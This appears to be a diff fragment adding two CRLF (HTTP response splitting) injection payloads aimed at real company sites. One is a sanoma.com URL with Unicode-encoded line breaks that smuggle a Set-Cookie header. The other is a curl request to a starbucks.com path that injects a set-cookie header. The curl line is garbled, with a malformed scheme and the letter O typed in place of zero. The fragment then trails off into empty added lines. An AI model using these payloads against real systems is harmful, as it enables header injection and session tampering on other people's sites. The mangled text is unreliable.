@@ -1,0 +1,25 @@
+http://www.sanoma.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection
+
+
+curl -i 'https:/twww.starbucks.com/email-prospecttg9wh%Od%Oaset-cookie:foo%Od%Oa%Od%Oa4t6uf?
+requesturl=/responsibility/global-report/policies' -d
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
